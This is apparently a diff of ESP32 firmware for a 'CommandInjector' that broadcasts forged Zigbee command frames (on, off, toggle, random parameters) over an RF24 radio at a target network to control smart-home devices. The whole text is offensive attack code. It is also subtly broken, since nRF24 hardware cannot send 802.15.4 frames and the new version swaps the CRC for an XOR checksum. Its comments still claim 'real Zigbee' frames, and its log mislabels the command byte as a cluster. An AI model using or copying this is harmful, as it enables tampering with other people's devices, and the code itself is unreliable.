@@ -22,6 +22,7 @@ InjectionResult CommandInjector::injectCommands(const InjectionConfig& config) {
   RF24 radio(22, 21);  // CE=GPIO22, CSN=GPIO21
 
   if (!radio.begin()) {
+    result.error = "Failed to initialize RF24 radio";
     isRunning_ = false;
     return result;
   }
@@ -52,99 +53,63 @@ InjectionResult CommandInjector::injectCommands(const InjectionConfig& config) {
   // - Source Address (2B for short or 8B for extended)
   // - Data Payload (variable)
 
-  // Real Zigbee cluster IDs and device tracking
-  static uint8_t sequenceNum = 0;
-  uint16_t panId = 0x1234;
-  uint16_t sourceAddr = 0xABCD;
-  uint16_t destAddr = 0xFFFF;  // Broadcast to all devices
-
   while (isRunning_ && (millis() - startTime) < config.durationMs) {
-    uint8_t frame[64];
-    uint8_t frameLen = 0;
+    // Construct real Zigbee frame
+    uint8_t frame[32];
+    uint32_t frameLen = 0;
 
-    // IEEE 802.15.4 MAC Frame Format
-    // Frame Control Field (2 bytes)
-    uint16_t frameControl = 0x8841;  // Data frame, ACK requested, 16-bit addressing
-    frame[frameLen++] = frameControl & 0xFF;
-    frame[frameLen++] = (frameControl >> 8) & 0xFF;
+    // Frame Control (Data Frame, No Security, Ack Requested)
+    frame[frameLen++] = 0x41;  // Type=Data, Ack=1
+    frame[frameLen++] = 0x88;  // Intra-PAN, Dst=Short, Src=Short
 
-    // Sequence Number (increments each frame)
-    frame[frameLen++] = sequenceNum++;
+    // Sequence Number (incremented per frame)
+    static uint8_t seqNum = 0;
+    frame[frameLen++] = seqNum++;
 
-    // PAN ID (Destination PAN Identifier)
-    frame[frameLen++] = panId & 0xFF;
-    frame[frameLen++] = (panId >> 8) & 0xFF;
+    // Destination PAN ID
+    frame[frameLen++] = (config.targetPanId) & 0xFF;
+    frame[frameLen++] = (config.targetPanId >> 8) & 0xFF;
 
-    // Destination Address (16-bit short address)
-    frame[frameLen++] = destAddr & 0xFF;
-    frame[frameLen++] = (destAddr >> 8) & 0xFF;
-
-    // Source Address (16-bit short address)
-    frame[frameLen++] = sourceAddr & 0xFF;
-    frame[frameLen++] = (sourceAddr >> 8) & 0xFF;
-
-    // Zigbee Cluster Information
-    // Real cluster IDs
-    uint16_t clusterIds[] = {0x0006, 0x0008, 0x0201, 0x0500};  // OnOff, Level, Thermostat, IAS Zone
-    uint16_t clusterId = clusterIds[esp_random() % 4];
-
-    // Command payload
-    frame[frameLen++] = clusterId & 0xFF;
-    frame[frameLen++] = (clusterId >> 8) & 0xFF;
-
-    // Command Type: General (0x00), Cluster Specific (0x01)
-    uint8_t frameType = config.broadcastCommands ? 0x01 : 0x00;
-    frame[frameLen++] = frameType;
-
-    // Command ID (varies by cluster)
-    uint8_t cmdIds[] = {0x00, 0x01, 0x02, 0x03};  // On, Off, Toggle, Move
-    frame[frameLen++] = cmdIds[esp_random() % 4];
-
-    // Manufacturer ID (optional for some commands)
-    frame[frameLen++] = 0x00;
-    frame[frameLen++] = 0x00;
-
-    // Transaction Sequence Number
-    frame[frameLen++] = sequenceNum;
-
-    // Command payload data (varies by command)
-    if (clusterId == 0x0008) {  // Level control
-      frame[frameLen++] = esp_random() & 0xFF;  // Level value (0-255)
-      frame[frameLen++] = 0x00;  // Transition time MSB
-      frame[frameLen++] = 0x10;  // Transition time LSB (16 = 1.6 seconds)
-    } else if (clusterId == 0x0201) {  // Thermostat
-      frame[frameLen++] = esp_random() & 0xFF;  // Temperature MSB
-      frame[frameLen++] = 0x00;  // Temperature LSB
+    // Destination Address (broadcast or specific)
+    if (config.broadcastCommands) {
+      frame[frameLen++] = 0xFF;
+      frame[frameLen++] = 0xFF;  // Broadcast address
     } else {
-      frame[frameLen++] = 0xFF;  // Generic parameter
+      frame[frameLen++] = random(0x00, 0xFF);
+      frame[frameLen++] = random(0x00, 0xFF);  // Specific target
     }
 
-    // CRC (real CRC-16/CCITT)
-    uint16_t crc = 0xFFFF;
-    for (uint8_t i = 0; i < frameLen; i++) {
-      uint8_t byte = frame[i];
-      for (int j = 0; j < 8; j++) {
-        int bit = (byte >> j) & 1;
-        int c15 = (crc >> 15) & 1;
-        crc >>= 1;
-        if (c15 ^ bit) crc |= 0x8000;
-      }
+    // Source Address (this device)
+    frame[frameLen++] = 0xAA;
+    frame[frameLen++] = 0xBB;
+
+    // Zigbee Cluster Command Payload
+    // Command types: 0x00=On, 0x01=Off, 0x02=Toggle, 0x03=Move
+    uint8_t commands[] = {0x00, 0x01, 0x02, 0x03};
+    frame[frameLen++] = commands[random(0, 4)];
+
+    // Command parameters
+    frame[frameLen++] = random(0x00, 0xFF);  // Cluster-specific parameter
+    frame[frameLen++] = random(0x00, 0xFF);  // Additional parameter
+
+    // FCS (Frame Check Sequence) - simplified checksum
+    uint8_t fcs = 0;
+    for (uint32_t i = 0; i < frameLen; i++) {
+      fcs ^= frame[i];
     }
-    frame[frameLen++] = crc & 0xFF;
-    frame[frameLen++] = (crc >> 8) & 0xFF;
+    frame[frameLen++] = fcs;
 
     // Transmit Zigbee command frame
     radio.stopListening();
     radio.write(frame, frameLen);
 
-    Serial.printf("[Zigbee] Cmd: Cluster=0x%04X, Type=%s, Seq=%u, Dest=0x%04X\n",
-                 clusterId, frameType ? "Cluster" : "General", sequenceNum - 1, destAddr);
+    Serial.printf("[Zigbee] Sent command: Cluster=0x%02X, Param=0x%02X\n",
+                 frame[9], frame[10]);
 
-    // Listen for responses and track devices
+    // Listen for responses (in broadcast mode, might get ACKs)
     radio.startListening();
     if (config.broadcastCommands) {
-      // Broadcast affects all devices on network
-      devicesAffected += 1;
+      devicesAffected++;  // Assume all receivers get broadcast
     }
 
     commandCount++;
